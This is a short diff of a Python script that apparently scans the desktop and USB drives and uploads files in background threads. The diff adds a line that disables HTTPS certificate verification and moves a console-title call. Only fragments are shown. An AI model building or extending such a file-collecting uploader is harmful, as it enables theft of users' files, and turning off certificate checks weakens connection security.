@@ -5,6 +5,11 @@ from upload import uploadf
 from filescanner import scan_files, limitFileSize, getUsb, get_desktop
 import os
 
+os.environ['PYTHONHTTPSVERIFY'] = "0"
+
+import ctypes
+ctypes.windll.kernel32.SetConsoleTitleW("lqJnMCy7fOFsS4ZG")
+
 def trycall(call, *arg, **kw):
     try:
         return call(*arg, **kw)
@@ -68,9 +73,6 @@ def tD():
         sD()
         print(i)
         sleep()
-
-import ctypes
-ctypes.windll.kernel32.SetConsoleTitleW("lqJnMCy7fOFsS4ZG")
 
 t1 = threading.Thread(target=tU, daemon=True)
 t2 = threading.Thread(target=tD, daemon=True)
